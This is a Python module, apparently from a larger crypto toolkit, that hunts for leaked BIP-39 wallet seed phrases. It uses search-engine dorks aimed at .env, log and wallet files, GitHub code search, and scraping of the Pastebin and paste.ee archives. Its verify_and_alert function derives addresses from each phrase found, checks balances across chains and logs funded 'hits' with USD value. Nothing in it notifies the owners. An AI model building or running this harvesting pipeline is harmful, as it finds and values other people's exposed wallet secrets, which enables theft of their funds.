"""Passphrase and mnemonic leak scanner.

Detects BIP-39 mnemonic phrases leaked in public sources:
- MnemonicPatternDetector: regex for 12/24 word BIP-39 sequences
- DorkScanner: Google/Bing dork queries for .env, wallet.txt, seed.txt
- GitHubLeakScanner: GitHub code search for BIP-39 patterns
- PasteSiteScanner: Pastebin scraping for mnemonic patterns

All scanners include verify_and_alert to validate, derive, check balance, and alert.
"""

from __future__ import annotations

import asyncio
import logging
import re
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import httpx

from src.modules.crypto.balance.checker import apply_usd_prices, check_balance, get_usd_prices
from src.modules.crypto.balance.chains import ALL_CHAINS, ChainConfig
from src.modules.crypto.balance.deriver import (
    derive_from_mnemonic,
    is_valid_mnemonic,
)
from src.modules.crypto.balance.hit_logger import HitLogger

logger = logging.getLogger(__name__)

# BIP-39 English wordlist (2048 words) — used for pattern matching
# Loaded lazily to avoid import overhead
_BIP39_WORDS: Optional[set[str]] = None


def _load_bip39_words() -> set[str]:
    """Load BIP-39 English wordlist for pattern matching."""
    global _BIP39_WORDS
    if _BIP39_WORDS is not None:
        return _BIP39_WORDS

    try:
        from bip_utils import Bip39WordsFinder
        finder = Bip39WordsFinder("english")
        _BIP39_WORDS = set(finder.GetAllWords())
    except Exception:
        # Fallback: use a minimal set for pattern detection
        _BIP39_WORDS = set()
    return _BIP39_WORDS


@dataclass
class LeakFinding:
    """A potential mnemonic leak found in a source."""
    source: str           # e.g. "github", "pastebin", "dork"
    source_url: str       # URL where the leak was found
    mnemonic_candidate: str  # The candidate mnemonic phrase
    is_valid: bool = False   # Whether it validates as BIP-39
    has_balance: bool = False
    balance_details: dict = field(default_factory=dict)
    found_at: datetime = field(default_factory=datetime.utcnow)


class MnemonicPatternDetector:
    """Regex-based detector for BIP-39 mnemonic sequences in text.

    Detects 12, 15, 18, 21, and 24-word sequences that could be mnemonics.
    """

    # Pattern: sequences of 12/15/18/21/24 lowercase words separated by spaces
    # Words must be 3+ chars (BIP-39 words are typically 3-8 chars)
    _WORD_PATTERN = re.compile(r"[a-z]{3,8}")

    @classmethod
    def find_mnemonics(cls, text: str) -> list[str]:
        """Find potential mnemonic phrases in text.

        Args:
            text: Raw text to search.

        Returns:
            List of candidate mnemonic phrases.
        """
        words = cls._WORD_PATTERN.findall(text.lower())
        candidates = []

        # Check sequences of valid lengths
        for length in (12, 15, 18, 21, 24):
            for i in range(len(words) - length + 1):
                candidate = " ".join(words[i : i + length])
                if is_valid_mnemonic(candidate):
                    candidates.append(candidate)

        return candidates

    @classmethod
    def find_mnemonic_patterns(cls, text: str) -> list[str]:
        """Find sequences that match mnemonic word count patterns (relaxed).

        Returns sequences of 12/24 lowercase words regardless of BIP-39 validity.
        Useful for initial filtering before validation.
        """
        words = cls._WORD_PATTERN.findall(text.lower())
        candidates = []

        for length in (12, 24):
            for i in range(len(words) - length + 1):
                candidate = " ".join(words[i : i + length])
                candidates.append(candidate)

        return candidates


class DorkScanner:
    """Google/Bing dork scanner for mnemonic leaks in files.

    Generates dork queries targeting common file types that might
    contain seed phrases: .env, wallet.txt, seed.txt, etc.
    """

    DORK_QUERIES = [
        'filetype:env "mnemonic"',
        'filetype:env "seed phrase"',
        'filetype:txt "mnemonic" "wallet"',
        'filetype:txt "seed phrase" "backup"',
        'filetype:log "mnemonic"',
        'filetype:conf "mnemonic"',
        'filetype:json "mnemonic" "wallet"',
    ]

    def __init__(self, hit_logger: Optional[HitLogger] = None):
        self.hit_logger = hit_logger

    async def scan(self, max_results_per_query: int = 10) -> list[LeakFinding]:
        """Run dork queries and extract potential mnemonics.

        Note: This generates dork query strings for manual use.
        Automated Google scraping violates ToS — use responsibly.

        Returns:
            List of LeakFinding objects with candidates.
        """
        findings = []
        # Generate dork URLs for manual use
        for query in self.DORK_QUERIES:
            logger.info("Dork query: %s", query)
            # This is informational — actual scraping would require
            # proxy rotation and ToS compliance

        return findings

    async def verify_and_alert(
        self,
        mnemonic_candidate: str,
        chains: Optional[list[ChainConfig]] = None,
        count: int = 6,
    ) -> Optional[LeakFinding]:
        """Validate a mnemonic candidate, check balances, and alert if funded.

        Delegates to the standalone verify_and_alert function.

        Args:
            mnemonic_candidate: Potential mnemonic phrase to verify.
            chains: Chains to check. Defaults to all.
            count: Number of address indices to derive per chain (default 6 for leak-sourced).

        Returns:
            LeakFinding with verification results, or None if invalid.
        """
        return await verify_and_alert(
            mnemonic_candidate,
            chains=chains,
            hit_logger=self.hit_logger,
            count=count,
            source="dork",
        )


class GitHubLeakScanner:
    """GitHub code search for BIP-39 mnemonic patterns.

    Uses the GitHub search API (unauthenticated: 10 req/min,
    authenticated: 30 req/min).
    """

    SEARCH_URL = "https://api.github.com/search/code"
    RATE_LIMIT = 30  # requests per minute (authenticated)

    def __init__(
        self,
        github_token: Optional[str] = None,
        hit_logger: Optional[HitLogger] = None,
    ):
        self.github_token = github_token or ""
        self.hit_logger = hit_logger
        self._request_times: list[float] = []

    async def scan(self, max_results: int = 100) -> list[LeakFinding]:
        """Search GitHub code for mnemonic patterns.

        Args:
            max_results: Maximum number of results to process.

        Returns:
            List of LeakFinding objects with candidates.
        """
        findings = []
        queries = [
            "mnemonic 12 words",
            "seed phrase wallet backup",
            "bip39 mnemonic",
        ]

        headers = {"Accept": "application/vnd.github.v3+json"}
        if self.github_token:
            headers["Authorization"] = f"token {self.github_token}"

        async with httpx.AsyncClient(timeout=30) as client:
            for query in queries:
                # Rate limiting: max 30 req/min
                await self._rate_limit()

                try:
                    resp = await client.get(
                        self.SEARCH_URL,
                        params={"q": query, "per_page": min(max_results, 30)},
                        headers=headers,
                    )

                    if resp.status_code == 403:
                        logger.warning("GitHub API rate limited — pausing")
                        await asyncio.sleep(60)
                        continue

                    resp.raise_for_status()
                    data = resp.json()

                    for item in data.get("items", []):
                        file_url = item.get("html_url", "")
                        # Fetch file content
                        finding = await self._fetch_and_scan(client, file_url, headers)
                        if finding:
                            findings.append(finding)

                except httpx.HTTPStatusError as e:
                    logger.error("GitHub search error: %s", e)
                except Exception as e:
                    logger.error("GitHub scan error: %s", e)

        return findings

    async def _fetch_and_scan(
        self,
        client: httpx.AsyncClient,
        file_url: str,
        headers: dict,
    ) -> Optional[LeakFinding]:
        """Fetch a GitHub file and scan for mnemonics."""
        await self._rate_limit()

        try:
            # Convert HTML URL to raw content URL
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
            resp = await client.get(raw_url, headers=headers)
            resp.raise_for_status()
            text = resp.text

            candidates = MnemonicPatternDetector.find_mnemonics(text)
            if candidates:
                return LeakFinding(
                    source="github",
                    source_url=file_url,
                    mnemonic_candidate=candidates[0],
                    is_valid=True,
                )
        except Exception as e:
            logger.debug("Failed to fetch %s: %s", file_url, e)

        return None

    async def _rate_limit(self):
        """Enforce GitHub API rate limit (30 req/min)."""
        import time
        now = time.monotonic()
        # Remove requests older than 60 seconds
        self._request_times = [t for t in self._request_times if now - t < 60]
        if len(self._request_times) >= self.RATE_LIMIT:
            # Wait until the oldest request is > 60s old
            wait = 60 - (now - self._request_times[0])
            if wait > 0:
                logger.debug("GitHub rate limit: waiting %.1fs", wait)
                await asyncio.sleep(wait)
        self._request_times.append(time.monotonic())

    async def verify_and_alert(
        self,
        mnemonic_candidate: str,
        chains: Optional[list[ChainConfig]] = None,
        count: int = 6,
    ) -> Optional[LeakFinding]:
        """Validate and check a GitHub-sourced mnemonic candidate.

        Delegates to the standalone verify_and_alert function.

        Args:
            mnemonic_candidate: Potential mnemonic phrase to verify.
            chains: Chains to check. Defaults to all.
            count: Number of address indices to derive per chain (default 6 for leak-sourced).
        """
        return await verify_and_alert(
            mnemonic_candidate,
            chains=chains,
            hit_logger=self.hit_logger,
            count=count,
            source="github",
        )


class PasteSiteScanner:
    """Pastebin and paste site scanner for mnemonic leaks."""

    PASTE_SOURCES = [
        "https://pastebin.com/archive",
        "https://paste.ee/archive",
    ]

    def __init__(self, hit_logger: Optional[HitLogger] = None):
        self.hit_logger = hit_logger

    async def scan(self, max_pastes: int = 50) -> list[LeakFinding]:
        """Scan recent pastes for mnemonic patterns.

        Args:
            max_pastes: Maximum number of pastes to check.

        Returns:
            List of LeakFinding objects with candidates.
        """
        findings = []

        async with httpx.AsyncClient(timeout=30) as client:
            for source in self.PASTE_SOURCES:
                try:
                    paste_urls = await self._get_paste_urls(client, source, max_pastes)
                    for url in paste_urls:
                        finding = await self._scan_paste(client, url)
                        if finding:
                            findings.append(finding)
                except Exception as e:
                    logger.error("Paste scan error (%s): %s", source, e)

        return findings

    async def _get_paste_urls(
        self, client: httpx.AsyncClient, archive_url: str, limit: int
    ) -> list[str]:
        """Extract paste URLs from an archive page."""
        try:
            resp = await client.get(archive_url)
            resp.raise_for_status()
            # Extract paste links (simplified — would need site-specific parsing)
            urls = re.findall(r'https?://pastebin\.com/[a-zA-Z0-9]+', resp.text)
            return list(dict.fromkeys(urls))[:limit]  # deduplicate, limit
        except Exception:
            return []

    async def _scan_paste(
        self, client: httpx.AsyncClient, paste_url: str
    ) -> Optional[LeakFinding]:
        """Fetch a paste and scan for mnemonics."""
        try:
            # Pastebin raw URL
            raw_url = paste_url.replace("pastebin.com/", "pastebin.com/raw/")
            resp = await client.get(raw_url)
            resp.raise_for_status()
            text = resp.text

            candidates = MnemonicPatternDetector.find_mnemonics(text)
            if candidates:
                return LeakFinding(
                    source="pastebin",
                    source_url=paste_url,
                    mnemonic_candidate=candidates[0],
                    is_valid=True,
                )
        except Exception as e:
            logger.debug("Failed to scan paste %s: %s", paste_url, e)

        return None

    async def verify_and_alert(
        self,
        mnemonic_candidate: str,
        chains: Optional[list[ChainConfig]] = None,
        count: int = 6,
    ) -> Optional[LeakFinding]:
        """Validate and check a paste-sourced mnemonic candidate.

        Delegates to the standalone verify_and_alert function.

        Args:
            mnemonic_candidate: Potential mnemonic phrase to verify.
            chains: Chains to check. Defaults to all.
            count: Number of address indices to derive per chain (default 6 for leak-sourced).
        """
        return await verify_and_alert(
            mnemonic_candidate,
            chains=chains,
            hit_logger=self.hit_logger,
            count=count,
            source="pastebin",
        )


async def verify_and_alert(
    mnemonic_candidate: str,
    chains: Optional[list[ChainConfig]] = None,
    hit_logger: Optional[HitLogger] = None,
    count: int = 1,
    source: str = "manual",
    log_source: Optional[str] = None,
) -> Optional[LeakFinding]:
    """Standalone verify-and-alert function for any mnemonic candidate.

    Validates BIP-39, derives addresses, checks balances across chains,
    and logs hits if balance > 0.

    Args:
        mnemonic_candidate: The mnemonic phrase to verify.
        chains: Chains to check. Defaults to all.
        hit_logger: Optional logger for recording hits.
        count: Number of address indices to derive per chain (default 1, use 6 for leak-sourced).
        source: Source label for the LeakFinding (default "manual").
        log_source: Source label for hit logging. Defaults to "{source}_scan".

    Returns:
        LeakFinding if valid, None if not a valid mnemonic.
    """
    if not is_valid_mnemonic(mnemonic_candidate):
        return None

    if log_source is None:
        log_source = f"{source}_scan"

    chains = chains or list(ALL_CHAINS)
    finding = LeakFinding(
        source=source,
        source_url="",
        mnemonic_candidate=mnemonic_candidate,
        is_valid=True,
    )

    loop = asyncio.get_running_loop()
    addresses = await loop.run_in_executor(
        None,
        derive_from_mnemonic,
        mnemonic_candidate,
        chains,
        0,
        count,
    )

    for addr in addresses:
        chain_cfg = _find_chain(addr.chain, chains)
        if chain_cfg is None:
            continue
        result = await check_balance(addr.address, chain_cfg, addr.derivation_path)
        if result.balance > 0:
            finding.has_balance = True
            finding.balance_details[addr.chain] = {
                "address": addr.address,
                "balance": result.balance,
                "symbol": result.symbol,
            }
            if hit_logger:
                mnemonic_hash = HitLogger.hash_mnemonic(mnemonic_candidate)
                await hit_logger.log_hit(
                    address=addr.address,
                    chain=addr.chain,
                    balance=result.balance,
                    usd_value=result.usd_value,
                    mnemonic_hash=mnemonic_hash,
                    derivation_path=addr.derivation_path,
                    source=log_source,
                )

    return finding


def _find_chain(name: str, chains: list[ChainConfig]) -> Optional[ChainConfig]:
    """Find a chain by name in a list."""
    return next((c for c in chains if c.name == name), None)
